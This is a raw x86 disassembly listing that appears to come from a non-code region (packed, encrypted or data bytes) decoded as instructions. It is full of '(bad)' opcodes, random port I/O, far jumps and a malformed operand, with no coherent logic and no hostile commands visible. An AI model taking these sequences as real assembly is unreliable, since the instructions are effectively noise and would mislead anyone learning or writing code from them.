  41c9af:	mov    ebp,0x93817651
  41c9b4:	sbb    DWORD PTR [ebx-0x4679d72e],ecx
  41c9ba:	add    al,0xfe
  41c9bc:	je     0x41c973
  41c9be:	(bad)  
  41c9bf:	push   edx
  41c9c0:	xor    al,0x4c
  41c9c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c9c3:	bound  esp,QWORD PTR [edx-0x5180741f]
  41c9c9:	pop    edi
  41c9ca:	mov    BYTE PTR ds:0xce4119f2,bl
  41c9d0:	ret    
  41c9d1:	fiadd  WORD PTR [ecx]
  41c9d3:	cmp    eax,0x2af30498
  41c9d8:	mov    dl,0x31
  41c9da:	fistp  WORD PTR [esi+0x26]
  41c9dd:	addr16 cld 
  41c9df:	push   cs
  41c9e0:	mov    DWORD PTR [ebx+ecx*2-0x4a],ebx
  41c9e4:	fdiv   DWORD PTR [ecx-0x7]
  41c9e7:	or     eax,0xa1b24fd1
  41c9ec:	sbb    eax,0x35a8c527
  41c9f1:	fistp  DWORD PTR [ebp+eiz*1-0x16dac3d]
  41c9f8:	adc    DWORD PTR [esi-0x74],edx
  41c9fb:	sbb    ebp,DWORD PTR [esi+edx*8-0x32bda578]
  41ca02:	and    ch,ch
  41ca04:	push   es
  41ca05:	fld    QWORD PTR [esi+ebp*2-0x510f493b]
  41ca0c:	mov    eax,0xeb44f4
	...
  41ca71:	add    BYTE PTR [eax],al
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	retf   
  41ca81:	xchg   edx,eax
  41ca82:	test   ah,0x50
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR [ecx+eax*1],al
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	in     al,0x96
  41ca8e:	out    0x9c,eax
  41ca90:	push   ebp
  41ca91:	mov    esp,0xeabd085b
  41ca96:	and    al,0x58
  41ca98:	mov    eax,0x860ce5ec
  41ca9d:	inc    ebx
  41ca9e:	xchg   ebp,eax
  41ca9f:	xchg   DWORD PTR [ebx+ebp*2],esi
  41caa2:	mov    ecx,0x8b4a1a9f
  41caa7:	jbe    0x41caef
  41caa9:	adc    eax,0xcd852270
  41caae:	out    0x7b,eax
  41cab0:	jnp    0x41caa5
  41cab2:	xor    DWORD PTR [ebx],ebp
  41cab4:	dec    ebp
  41cab5:	(bad)  
  41cab6:	mov    ch,0xaf
  41cab8:	in     eax,0x53
  41caba:	rcr    DWORD PTR [esi-0x6a],1
  41cabd:	pushf  
  41cabe:	mov    BYTE PTR [ebp+0x59],bl
  41cac1:	vsubss xmm6,xmm0,DWORD PTR ds:0xdd124be4
  41cac9:	xchg   DWORD PTR [ebx+0x340b0d3a],ebp
  41cacf:	popf   
  41cad0:	repz mov dh,0x6c
  41cad3:	hlt    
  41cad4:	std    
  41cad5:	add    BYTE PTR [edx+0x1c342523],bl
  41cadb:	icebp  
  41cadc:	xchg   DWORD PTR ds:0x63cba1a7,ebp
  41cae2:	ds jp  0x41ca69
  41cae5:	fnstsw WORD PTR [edx-0x26]
  41cae8:	lahf   
  41cae9:	fmul   DWORD PTR [edx-0x5596151b]
  41caef:	xor    edi,DWORD PTR [eax]
  41caf1:	mov    ds:0xb411c8b1,eax
  41caf6:	shl    DWORD PTR [eax],cl
  41caf8:	fcomp  QWORD PTR [eax-0x2da3929c]
  41cafe:	into   
  41caff:	std    
  41cb00:	in     al,dx
  41cb01:	out    dx,eax
  41cb02:	sub    eax,0xe77d8b9c
  41cb07:	ret    
  41cb08:	rol    BYTE PTR [edi+0x56d1dead],0x29
  41cb0f:	cmp    edi,DWORD PTR [edx+ebp*8+0x13]
  41cb13:	out    0x6a,eax
  41cb15:	ins    BYTE PTR es:[edi],dx
  41cb16:	xlat   BYTE PTR ds:[ebx]
  41cb17:	bound  edi,QWORD PTR [ebp-0x4f]
  41cb1a:	cmp    BYTE PTR [esi],al
  41cb1c:	mov    ebx,0xb2f03530
  41cb21:	out    0x27,eax
  41cb23:	fwait
  41cb24:	outs   dx,BYTE PTR ds:[esi]
  41cb25:	(bad)  
  41cb26:	mov    dl,0x82
  41cb28:	scas   eax,DWORD PTR es:[edi]
  41cb29:	add    cl,BYTE PTR [ebx-0x36]
  41cb2c:	shl    BYTE PTR [ecx+0x74],1
  41cb2f:	leave  
  41cb30:	aad    0x4e
  41cb32:	jo     0x41cbad
  41cb34:	sub    ebx,DWORD PTR [esi+0x25e3d429]
  41cb3a:	mov    ecx,DWORD PTR [edi+0x537d5919]
  41cb40:	adc    eax,0x204d437c
  41cb45:	popf   
  41cb46:	pop    es
  41cb47:	fild   DWORD PTR [ecx-0x48]
  41cb4a:	retf   0xa6ea
  41cb4d:	sub    ch,ah
  41cb4f:	jnp    0x41cb15
  41cb51:	ins    BYTE PTR es:[edi],dx
  41cb52:	lods   eax,DWORD PTR ds:[esi]
  41cb53:	out    dx,al
  41cb54:	fdivr  QWORD PTR [esi]
  41cb56:	iret   
  41cb57:	sbb    edx,ebp
  41cb59:	scas   eax,DWORD PTR es:[edi]
  41cb5a:	xor    al,BYTE PTR [ebp+0x85e8aa9]
  41cb60:	je     0x41cb61
  41cb62:	sbb    BYTE PTR [edi-0xa],cl
  41cb65:	scas   eax,DWORD PTR es:[edi]
  41cb66:	ret    
  41cb67:	jmp    0x41cb80
  41cb69:	dec    edi
  41cb6a:	push   edi
  41cb6b:	js     0x41cb1f
  41cb6d:	sti    
  41cb6e:	enter  0x2ba9,0x6e
  41cb72:	inc    edx
  41cb73:	into   
  41cb74:	adc    al,0x19
  41cb76:	cmc    
  41cb77:	xor    BYTE PTR [ebx+0x76],dh
  41cb7a:	and    esi,esi
  41cb7c:	fdiv   st,st(6)
  41cb7e:	jo     0x41cb70
  41cb80:	inc    ebx
  41cb81:	dec    ebx
  41cb82:	add    al,0xec
  41cb84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cb85:	retf   
  41cb86:	outs   dx,DWORD PTR ds:[esi]
  41cb87:	stc    
  41cb88:	das    
  41cb89:	out    dx,eax
  41cb8a:	adc    eax,0xfaa3342c
  41cb8f:	inc    edi
	...
  41cbf4:	sub    esi,edx
  41cbf6:	sti    
  41cbf7:	pop    ebp
  41cbf8:	(bad)  
  41cbf9:	jge    0x41cbaa
  41cbfb:	neg    cl
  41cbfd:	hlt    
  41cbfe:	add    eax,0x3bd12f22
  41cc03:	scas   al,BYTE PTR es:[edi]
  41cc04:	push   esp
  41cc05:	xor    DWORD PTR [ecx],eax
  41cc07:	add    BYTE PTR [ecx+eax*1],al
  41cc0a:	add    BYTE PTR [eax],al
  41cc0c:	xchg   ebx,eax
  41cc0d:	adc    al,0xd4
  41cc0f:	clc    
  41cc10:	pop    es
  41cc11:	and    eax,0x493e081a
  41cc16:	out    dx,eax
  41cc17:	inc    edi
  41cc18:	stc    
  41cc19:	push   esi
  41cc1a:	out    dx,eax
  41cc1b:	pop    edi
  41cc1c:	xchg   BYTE PTR [ebp+0x58c56065],cl
  41cc22:	rcr    bl,0x1c
  41cc25:	nop
  41cc26:	mov    edi,0xcda2a055
  41cc2b:	adc    al,0x24
  41cc2d:	xchg   edx,eax
  41cc2e:	or     eax,0x5086b3
  41cc33:	dec    edi
  41cc34:	ja     0x41cc4d
  41cc36:	jg     0x41cca9
  41cc38:	fiadd  DWORD PTR [edi+0x617c8bcb]
  41cc3e:	(bad)  
  41cc3f:	add    dl,BYTE PTR [ebp+0x4f83e571]
  41cc45:	ret    
  41cc46:	xchg   bl,dl
  41cc48:	bnd js 0x41cc5d
  41cc4b:	mov    al,0x51
  41cc4d:	xchg   esp,eax
  41cc4e:	mov    edi,0x3fe796df
  41cc53:	pop    es
  41cc54:	jo     0x41cc44
  41cc56:	mov    dh,0x57
  41cc58:	sub    DWORD PTR [edi-0x4b],esp
  41cc5b:	xchg   al,bh
  41cc5d:	jbe    0x41cc77
  41cc5f:	jp     0x41cc73
  41cc61:	sbb    al,0x9c
  41cc63:	ror    BYTE PTR [edx-0x31a93796],cl
  41cc69:	faddp  st(5),st
  41cc6b:	std    
  41cc6c:	sbb    bl,BYTE PTR [esi-0x30]
  41cc6f:	inc    edx
  41cc70:	out    0xc5,eax
  41cc72:	mov    al,0x96
  41cc74:	call   0x12a4:0x4a664b9f
  41cc7b:	push   es
  41cc7c:	mov    dh,0x8e
  41cc7e:	jne    0x41cc10
  41cc80:	dec    ebp
  41cc81:	mov    cl,0xd5
  41cc83:	jo     0x41cd04
  41cc85:	mov    ebp,0xec2240aa
  41cc8a:	(bad)  
  41cc8b:	jmp    0x41cd0a
  41cc8d:	sub    eax,0x242f9d32
  41cc92:	or     esp,DWORD PTR [ebp+0x2b67d836]
  41cc98:	addr16 dec esi
  41cc9a:	frstor [edx-0x3b]
  41cc9d:	cmp    DWORD PTR [ebx-0x49],ecx
  41cca0:	pop    esp
  41cca1:	inc    edx
  41cca2:	imul   ebx,edi,0x7f
  41cca5:	cld    
  41cca6:	dec    edi
  41cca7:	add    BYTE PTR ds:0x64b028c7,ah
  41ccad:	xchg   edx,eax
  41ccae:	pop    ebx
  41ccaf:	addr16 sbb eax,0x6ee9af2f
  41ccb5:	dec    eax
  41ccb6:	fidivr DWORD PTR [edi-0x3]
  41ccb9:	scas   eax,DWORD PTR es:[edi]
  41ccba:	xor    al,0xd9
  41ccbc:	jl     0x41cc52
  41ccbe:	test   bl,bh
  41ccc0:	pop    edx
  41ccc1:	bound  edi,QWORD PTR [edx+ebp*8-0x424e2b7a]
  41ccc8:	jl     0x41cc54
  41ccca:	sub    eax,0x3fbd74a1
  41cccf:	xor    esi,DWORD PTR [ebp-0x27]
  41ccd2:	adc    esi,DWORD PTR [ecx+edx*4]
  41ccd5:	pop    ecx
  41ccd6:	(bad)  
  41ccd7:	cmc    
  41ccd8:	das    
  41ccd9:	ficom  DWORD PTR [edx]
  41ccdb:	dec    eax
  41ccdc:	fistp  WORD PTR [esi+0x22]
  41ccdf:	dec    esp
  41cce0:	dec    ebp
  41cce1:	std    
  41cce2:	mov    al,ds:0x7fd7ab4b
  41cce7:	ja     0x41cd20
  41cce9:	and    eax,DWORD PTR [edi+0x47]
  41ccec:	aaa    
  41cced:	mov    ebp,0x41b4a043
  41ccf2:	stos   DWORD PTR es:[edi],eax
  41ccf3:	pop    esi
  41ccf4:	jmp    0x41ccf9
  41ccf6:	inc    edi
  41ccf7:	pop    ebx
  41ccf8:	test   eax,0xd85fb0ec
  41ccfd:	sbb    al,0xf2
  41ccff:	xor    BYTE PTR [eax+eax*1],cl
  41cd02:	push   esi
  41cd03:	cld    
  41cd04:	mov    ?,WORD PTR ds:0xb09f2c9b
  41cd0a:	xchg   esp,eax
  41cd0b:	pop    eax
  41cd0c:	add    esi,ebp
  41cd0e:	iret   
  41cd0f:	sub    al,0x0
	...
  41cd71:	add    BYTE PTR [eax],al
  41cd73:	add    BYTE PTR [eax-0x67],ah
  41cd76:	fsubr  st(5),st
  41cd78:	std    
  41cd79:	in     eax,0x79
  41cd7b:	popf   
  41cd7c:	in     al,dx
  41cd7d:	stc    
  41cd7e:	jmp    0x41cdb0
  41cd80:	cdq    
  41cd81:	jle    0x41cd22
  41cd83:	adc    ebx,DWORD PTR [eax+0x32]
  41cd86:	add    DWORD PTR [eax],eax
  41cd88:	add    al,0x1
  41cd8a:	add    BYTE PTR [eax],al
  41cd8c:	aaa    
  41cd8d:	xchg   ebx,eax
  41cd8e:	jmp    0x6fbb:0x7f2a3853
  41cd95:	and    eax,0x4673fbf1
  41cd9a:	stos   BYTE PTR es:[edi],al
  41cd9b:	lods   eax,DWORD PTR ds:[esi]
  41cd9c:	gs mov edx,0xa0bfc2ed
  41cda2:	dec    eax
  41cda3:	mov    bh,0x45
  41cda5:	arpl   WORD PTR [eax],dx
  41cda7:	cli    
  41cda8:	arpl   si,ax
  41cdaa:	xchg   DWORD PTR [edi],esi
  41cdac:	imul   esi,DWORD PTR [eax+eiz*2],0x91f0619c
  41cdb3:	std    
  41cdb4:	jecxz  0x41cdd9
  41cdb6:	jle    0x41cd66
  41cdb8:	(bad)  
  41cdba:	fdivr  st(5),st
  41cdbc:	adc    eax,0xaeee8901
  41cdc1:	test   DWORD PTR [edx+0x4e],edx
  41cdc4:	fdivrp st(3),st
  41cdc6:	xchg   esi,eax
  41cdc7:	lds    eax,FWORD PTR [edi+0x419074a]
  41cdcd:	inc    edi
  41cdce:	push   esi
  41cdcf:	xchg   cl,dh
  41cdd1:	shl    BYTE PTR gs:[eax-0x51945b28],1
  41cdd8:	inc    edi
  41cdd9:	iret   
  41cdda:	mov    ebp,0x3d266610
  41cddf:	xchg   esp,eax
  41cde0:	inc    ecx
  41cde1:	pop    edi
  41cde2:	dec    ebx
  41cde3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cde4:	scas   eax,DWORD PTR es:[edi]
  41cde5:	or     al,0x9
  41cde7:	inc    edx
  41cde8:	enter  0xc8a2,0xfb
  41cdec:	push   ecx
  41cded:	sub    DWORD PTR [eax+0x42],esp
  41cdf0:	daa    
  41cdf1:	sti    
  41cdf2:	cli    
  41cdf3:	sub    eax,0xa2734c55
  41cdf8:	(bad)  
  41cdf9:	(bad)  
  41cdfa:	fchs   
  41cdfc:	cdq    
  41cdfd:	cmp    edx,DWORD PTR [edx]
  41cdff:	mov    eax,0x76d12562
  41ce04:	or     al,0x18
  41ce06:	std    
  41ce07:	popf   
  41ce08:	retf   
  41ce09:	mov    ds:0xe8b714a1,al
  41ce0e:	sti    
  41ce0f:	cmp    eax,0x26ed311a
  41ce14:	cdq    
  41ce15:	je     0x41cdb2
  41ce17:	inc    edi
  41ce18:	dec    ebx
  41ce19:	cmp    esp,DWORD PTR [ecx]
  41ce1b:	and    eax,0x4bd8c91c
  41ce20:	leave  
  41ce21:	out    dx,eax
  41ce22:	dec    ebx
  41ce23:	and    bh,cl
  41ce25:	pop    edx
  41ce26:	or     eax,0xb1430602
  41ce2b:	jmp    0x5e1a:0x6979d3b1
  41ce32:	outs   dx,BYTE PTR ds:[esi]
  41ce33:	inc    esp
  41ce34:	arpl   cx,bx
  41ce36:	xchg   DWORD PTR ds:0x7211f9eb,esi
  41ce3c:	jnp    0x41ce39
  41ce3e:	xor    ecx,DWORD PTR [ebx-0x1b]
  41ce41:	into   
  41ce42:	xchg   ebx,eax
  41ce43:	and    edx,DWORD PTR [ecx]
  41ce45:	xor    BYTE PTR [eax-0x63502107],bl
  41ce4b:	sub    ch,BYTE PTR [edi]
  41ce4d:	push   edx
  41ce4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce4f:	mov    edi,DWORD PTR [edi+esi*8+0x2bc1d246]
  41ce56:	imul   ecx,DWORD PTR [eax+ecx*2+0x2a88a821],0x7d84fb03
  41ce61:	pop    ebx
  41ce62:	repnz popa 
  41ce64:	ret    0x4fcd
  41ce67:	or     eax,0xb462b17
  41ce6c:	retf   
  41ce6d:	jae    0x41cec6
  41ce6f:	xchg   edi,eax
  41ce70:	popf   
  41ce71:	popf   
  41ce72:	sbb    BYTE PTR [eax+0x24],ah
  41ce75:	popf   
  41ce76:	cwde   
  41ce77:	test   dh,0x4f
  41ce7a:	and    DWORD PTR [ebx],edi
  41ce7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce7d:	leave  
  41ce7e:	inc    esp
  41ce7f:	mov    ch,0xb
  41ce81:	test   BYTE PTR [edx-0x5f],ah
  41ce84:	fisttp QWORD PTR [edx]
  41ce86:	sub    ecx,ebx
  41ce88:	(bad)  
  41ce89:	jl     0x49a69510
  41ce8f:	xlat   BYTE PTR ds:[ebx]
	...
  41cef4:	pop    es
  41cef5:	jp     0x41cedf
  41cef7:	jnp    0x41cef6
  41cef9:	sti    
  41cefa:	xchg   edi,eax
  41cefb:	jle    0x41cf44
  41cefd:	jp     0x41ced9
  41ceff:	lods   al,BYTE PTR ds:[esi]
  41cf00:	mov    DWORD PTR [eax-0x8],ebx
  41cf03:	sbb    ebx,DWORD PTR [ebx+esi*1+0x1]
  41cf07:	add    BYTE PTR [ecx+eax*1],al
  41cf0a:	add    BYTE PTR [eax],al
  41cf0c:	sbb    ebx,edi
  41cf0e:	inc    esi
  41cf0f:	(bad)  
  41cf10:	shl    DWORD PTR [ebp-0x15772e5d],cl
  41cf16:	test   eax,0x8f881739
  41cf1b:	js     0x41cf60
  41cf1d:	cmp    BYTE PTR [ebx],ch
  41cf1f:	adc    ebx,DWORD PTR [edi-0x80]
  41cf22:	pop    esi
  41cf23:	clc    
  41cf24:	lahf   
  41cf25:	outs   dx,DWORD PTR ds:[esi]
  41cf26:	cld    
  41cf27:	lods   al,BYTE PTR ds:[esi]
  41cf28:	or     ebx,DWORD PTR [esi]
  41cf2a:	fsubr  QWORD PTR [eax]
  41cf2c:	sbb    al,BYTE PTR [ecx-0x71]
  41cf2f:	xlat   BYTE PTR ds:[ebx]
  41cf30:	pop    ds
  41cf31:	xchg   edx,eax
  41cf32:	add    DWORD PTR [ebx+0x459af73f],ebp
  41cf38:	in     eax,0x80
  41cf3a:	or     al,0x89
  41cf3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf3d:	inc    ebx
  41cf3e:	sbb    BYTE PTR [edx+edi*8+0x25059a79],dl
  41cf45:	xor    edx,DWORD PTR [edx]
  41cf47:	adc    BYTE PTR [esi-0x200405e5],0xe8
  41cf4e:	xor    ebp,esp
  41cf50:	xor    esi,DWORD PTR [eax-0x428d12d5]
  41cf56:	fmul   DWORD PTR [ebx+0x32]
  41cf59:	in     eax,0xeb
  41cf5b:	lds    esp,FWORD PTR [ebx]
  41cf5d:	or     BYTE PTR [ebx-0x1b],ah
  41cf60:	leave  
  41cf61:	inc    ebp
  41cf62:	push   eax
  41cf63:	add    BYTE PTR [ebx-0x5aed3bdb],al
  41cf69:	mul    BYTE PTR [edx*4-0x39d70a2d]
  41cf70:	push   es
  41cf71:	lahf   
  41cf72:	mov    WORD PTR [esi+edx*8],fs
  41cf75:	mov    cl,0xa8
  41cf77:	xor    eax,0xfff90cc0
  41cf7c:	popf   
  41cf7d:	sbb    DWORD PTR [ebx+eiz*2],ebp
  41cf80:	daa    
  41cf81:	mov    al,ds:0x6453d426
  41cf86:	pop    ebp
  41cf87:	mov    eax,0xc72c22b1
  41cf8c:	mov    esp,0xcee0158c
  41cf91:	test   eax,0x251edbdc
  41cf96:	sbb    DWORD PTR [ebx+edi*1],ebp
  41cf99:	pop    eax
  41cf9a:	int    0x15
  41cf9c:	cmp    esp,esp
  41cf9e:	jmp    0x41cf67
  41cfa0:	sbb    eax,0x5f31aebc
  41cfa5:	and    DWORD PTR [eax],esp
  41cfa7:	and    bl,0xe2
  41cfaa:	cwde   
  41cfab:	rcl    DWORD PTR cs:[edx+0x5b],cl
  41cfaf:	mov    al,0xda
  41cfb1:	cmp    al,0x6c
  41cfb3:	sbb    ch,BYTE PTR [esi-0xa010f94]
  41cfb9:	pop    edx
  41cfba:	(bad)  
  41cfbc:	push   edi
  41cfbd:	and    ch,BYTE PTR [edi]
  41cfbf:	pushf  
  41cfc0:	cmp    BYTE PTR [ebx-0x1746aba7],ah
  41cfc6:	stc    
  41cfc7:	int3   
  41cfc8:	lods   al,BYTE PTR ds:[esi]
  41cfc9:	jnp    0x41cf52
  41cfcb:	and    BYTE PTR [edx-0x7342c229],cl
  41cfd1:	cwde   
  41cfd2:	stos   BYTE PTR es:[edi],al
  41cfd3:	cmp    eax,0x55f16c01
  41cfd8:	imul   edx,DWORD PTR [eax-0x2f17f8de],0xffffff84
  41cfdf:	call   0x5146:0xf3d74fa1
  41cfe6:	xor    DWORD PTR [esp+eiz*2],ecx
  41cfe9:	mov    bh,0x6e
  41cfeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfec:	adc    cl,al
  41cfee:	aam    0xa0
  41cff0:	pop    ebp
  41cff1:	cmp    cl,dl
  41cff3:	pop    edx
  41cff4:	adc    eax,0x16608814
  41cff9:	dec    edi
  41cffa:	dec    ebx
  41cffb:	es push edi
  41cffd:	scas   eax,DWORD PTR es:[edi]
  41cffe:	mov    esp,0x1661cd34
  41d003:	push   ss
  41d004:	jmp    0x38fc8d92
  41d009:	push   es
  41d00a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d00b:	enter  0xb534,0x4d
  41d00f:	mov    al,BYTE PTR [eax]
	...
  41d071:	add    BYTE PTR [eax],al
  41d073:	add    BYTE PTR [ecx-0x52bcdfcc],bh
  41d079:	push   edi
  41d07a:	sti    
  41d07b:	dec    BYTE PTR [esi-0x1b]
  41d07e:	mov    ebp,0xa7c09ebd
  41d083:	ds pusha 
  41d085:	xor    al,0x1
  41d087:	add    BYTE PTR [ecx+eax*1],al
  41d08a:	add    BYTE PTR [eax],al
  41d08c:	inc    BYTE PTR [edi-0x2f7f7050]
  41d092:	push   0x4a6fad73
  41d097:	and    eax,0x5c7f839a
  41d09c:	sbb    al,0x6a
  41d09e:	mov    dh,0x16
  41d0a0:	adc    BYTE PTR [esp+ebx*1],cl
  41d0a3:	mov    ebx,0x4a855aa1
  41d0a8:	or     cl,BYTE PTR [edi+ebx*8-0x25]
  41d0ac:	out    dx,al
  41d0ad:	(bad)  
  41d0ae:	loope  0x41d08f
  41d0b0:	sub    BYTE PTR [ebp+0x58f8ea46],dl
  41d0b6:	mov    dh,0xa0
  41d0b8:	pop    eax
  41d0b9:	xchg   esp,eax
  41d0ba:	mov    eax,ds:0xce9f0b6f
  41d0bf:	cmp    eax,0xb8a19e0e
  41d0c4:	int3   
  41d0c5:	ins    BYTE PTR es:[edi],dx
  41d0c6:	daa    
  41d0c7:	push   ecx
  41d0c8:	mov    WORD PTR [edi+0x2acdd0e7],cs
  41d0ce:	leave  
  41d0cf:	pand   mm5,mm7
  41d0d2:	inc    edx
  41d0d3:	icebp  
  41d0d4:	rcr    ch,1
  41d0d6:	fdivrp st(7),st
  41d0d8:	mov    al,0x1d
  41d0da:	cld    
  41d0db:	mov    al,ds:0x81096112
  41d0e0:	xchg   ebx,eax
  41d0e1:	xor    ebx,DWORD PTR [eax+0x1]
  41d0e4:	imul   BYTE PTR [ecx]
  41d0e6:	in     al,0x15
  41d0e8:	nop
  41d0e9:	or     al,BYTE PTR [eax]
  41d0eb:	iret   
  41d0ec:	and    al,ah
  41d0ee:	jl     0x41d121
  41d0f0:	(bad)  
  41d0f1:	fisubr WORD PTR [ecx+0x336dae82]
  41d0f7:	push   0x231b7657
  41d0fc:	sbb    BYTE PTR [edx+0x4e],0xa1
  41d100:	fs sub dl,0x35
  41d104:	mov    esp,0x192b5cca
  41d109:	daa    
  41d10a:	xor    BYTE PTR [ecx+ebp*1-0x374fc4aa],dh
  41d111:	test   BYTE PTR [ecx-0x77f52e61],ah
  41d117:	mov    bh,0x24
  41d119:	push   edi
  41d11a:	dec    eax
  41d11b:	out    dx,eax
  41d11c:	sbb    al,0x89
  41d11e:	and    eax,0xccaf0746
  41d123:	jb     0x41d0f5
  41d125:	add    eax,DWORD PTR [esi+0x65]
  41d128:	sti    
  41d129:	cmp    al,0x22
  41d12b:	sub    edx,DWORD PTR [edx]
  41d12d:	dec    edx
  41d12e:	hlt    
  41d12f:	cmp    dh,bl
  41d131:	pop    edx
  41d132:	sub    BYTE PTR [eax+0x3c],bh
  41d135:	sbb    cl,0xff
  41d138:	jge    0x41d0cb
  41d13a:	add    BYTE PTR [edi-0x65],0x9d
  41d13e:	out    0x60,eax
  41d140:	pop    edx
  41d141:	test   bl,dl
  41d143:	into   
  41d144:	(bad)  [ebx]
  41d146:	sbb    DWORD PTR [ebx],edi
  41d148:	and    eax,0xba04f71d
  41d14d:	cmp    DWORD PTR [edi],ebx
  41d14f:	jae    0x41d12f
  41d151:	pop    es
  41d152:	inc    esi
  41d153:	jg     0x41d1c6
  41d155:	imul   ebp,DWORD PTR [edx+0x25cebbc6],0xf81cc847
  41d15f:	in     al,dx
  41d160:	inc    ebx
  41d161:	loop   0x41d12d
  41d163:	cmp    bh,BYTE PTR ds:[edx]
  41d166:	adc    dh,cl
  41d168:	iret   
  41d169:	mov    ch,0xff
  41d16b:	xchg   esp,esi
  41d16d:	jle    0x41d137
  41d16f:	loop   0x41d121
  41d171:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d172:	pop    esp
  41d173:	cdq    
  41d174:	std    
  41d175:	mov    al,ds:0xc4a3705e
  41d17a:	neg    BYTE PTR [ebp-0x5d]
  41d17d:	loopne 0x41d150
  41d17f:	imul   esi,DWORD PTR [ebp-0x2d],0xffffff9c
  41d183:	or     ebp,ecx
  41d185:	mov    DWORD PTR [edx],0xfde09611
  41d18b:	mov    bh,0x90
  41d18d:	loop   0x41d183
  41d18f:	fwait
	...
  41d1f4:	push   eax
  41d1f5:	ret    
  41d1f6:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d1fc:	xor    DWORD PTR [ebp-0x7],esp
  41d1ff:	hlt    
  41d200:	aam    0x2d
  41d202:	xchg   edi,eax
  41d203:	loopne 0x41d269
  41d205:	xor    eax,0x1040001
  41d20a:	add    BYTE PTR [eax],al
  41d20c:	xor    BYTE PTR [ecx+0x8],bh
  41d20f:	inc    ebp
  41d210:	dec    edx
  41d211:	pop    eax
  41d212:	hlt    
  41d213:	out    0xe4,al
  41d215:	dec    edi
  41d216:	or     eax,0x2e411bdf
  41d21b:	out    dx,eax
  41d21c:	shr    DWORD PTR [eax+0x66ba0b2f],1
  41d222:	rcl    BYTE PTR [edi+0x59],0xf6
  41d226:	in     al,0x91
  41d228:	xchg   ecx,eax
  41d229:	mov    ah,0xce
  41d22b:	sbb    al,0x4d
  41d22d:	cmp    eax,DWORD PTR [ecx+0x1be7b6a3]
  41d233:	icebp  
  41d234:	mov    al,0x50
  41d236:	cmp    ah,BYTE PTR [ecx+0x788650e1]
  41d23c:	sbb    DWORD PTR [ebx-0x55],esi
  41d23f:	adc    ah,al
  41d241:	das    
  41d242:	cld    
  41d243:	jae    0x41d257
  41d245:	loop   0x41d233
  41d247:	es mov cl,0x38
  41d24a:	dec    ebp
  41d24b:	int    0x8a
  41d24d:	clc    
  41d24e:	rcl    DWORD PTR cs:[edx+eiz*1],0xd9
  41d253:	test   eax,0xca8932f8
  41d258:	pop    es
  41d259:	bnd jb 0x41d25d
  41d25c:	mov    ds:0x9a55f49f,eax
  41d261:	les    ebp,FWORD PTR [eax-0x231b5191]
  41d267:	mov    ebx,0x611f4f58
  41d26c:	mov    cl,0x77
  41d26e:	mov    bl,0x70
  41d270:	mov    al,ds:0x1b78091a
  41d275:	retf   
  41d276:	mov    ecx,0xef0a9cb4
  41d27b:	rcl    esp,0x7e
  41d27e:	push   ebp
  41d27f:	popf   
  41d280:	adc    BYTE PTR [ebx+ebp*2-0x72840c],ah
  41d287:	pop    es
  41d288:	sahf   
  41d289:	jge    0x41d229
  41d28b:	mov    BYTE PTR [ecx+0x2ea8048a],dl
  41d291:	mov    al,0x39
  41d293:	sub    BYTE PTR [esi],0x48
  41d296:	lods   eax,DWORD PTR ds:[esi]
  41d297:	(bad)  [eax+0x5665f954]
  41d29d:	and    esp,ecx
  41d29f:	mov    ds:0xd5670255,eax
  41d2a4:	cs cld 
  41d2a6:	pop    ebp
  41d2a7:	retf   0x6296
  41d2aa:	in     eax,0xb4
  41d2ac:	mov    BYTE PTR [edx-0x41bd0aee],bl
  41d2b2:	push   ecx
  41d2b3:	mov    fs,WORD PTR [ebp+0x7c64b134]
  41d2b9:	xchg   edx,eax
  41d2ba:	xchg   esi,eax
  41d2bb:	and    eax,0xc4af9f67
  41d2c0:	outs   dx,BYTE PTR ds:[esi]
  41d2c1:	jg     0x41d2d4
  41d2c3:	cli    
  41d2c4:	cmp    DWORD PTR [edi-0x8a351f5],ebx
  41d2ca:	cmp    edx,DWORD PTR [edi]
  41d2cc:	imul   esi,DWORD PTR [ebx],0xd9661233
  41d2d2:	shl    DWORD PTR [edx+edx*2],0xe3
  41d2d6:	in     al,dx
  41d2d7:	rol    DWORD PTR [ebx+0x5a8e0cd7],0xbd
  41d2de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2df:	sub    cl,BYTE PTR [edx+ecx*4-0x366f8133]
  41d2e6:	test   al,0x7a
  41d2e8:	imul   esp,DWORD PTR [edi+0x77],0x3abef2f
  41d2ef:	popa   
  41d2f0:	jg     0x41d278
  41d2f2:	imul   eax,DWORD PTR [esi+0x10],0xfcf40b1b
  41d2f9:	int3   
  41d2fa:	in     eax,0xb9
  41d2fc:	xor    dl,0xe3
  41d2ff:	or     eax,0xb08ceae9
  41d304:	rcl    BYTE PTR ss:[edi],1
  41d307:	js     0x41d2fd
  41d309:	mov    ebx,0x40ac610c
  41d30e:	(bad)  
  41d30f:	and    DWORD PTR [eax],eax
	...
  41d371:	add    BYTE PTR [eax],al
  41d373:	add    dh,bh
  41d375:	cmp    cl,0x54
  41d378:	(bad)  
  41d379:	jge    0x41d37a
  41d37b:	stos   BYTE PTR es:[edi],al
  41d37c:	lea    ebp,[edi]
  41d37e:	shr    BYTE PTR [ecx+0x3c],0xa9
  41d382:	mov    ah,0xb5
  41d384:	push   0x4000136
  41d389:	add    DWORD PTR [eax],eax
  41d38b:	add    BYTE PTR [eax+0x2a7f1fe1],dh
  41d391:	sub    ah,cl
  41d393:	gs xchg edi,eax
  41d395:	inc    ebx
  41d396:	into   
  41d397:	aas    
  41d398:	repz ja 0x41d410
  41d39b:	ror    BYTE PTR [eax-0x6],cl
  41d39e:	or     eax,0xda774ed6
  41d3a3:	cmp    cl,BYTE PTR [ecx+0x6f]
  41d3a6:	das    
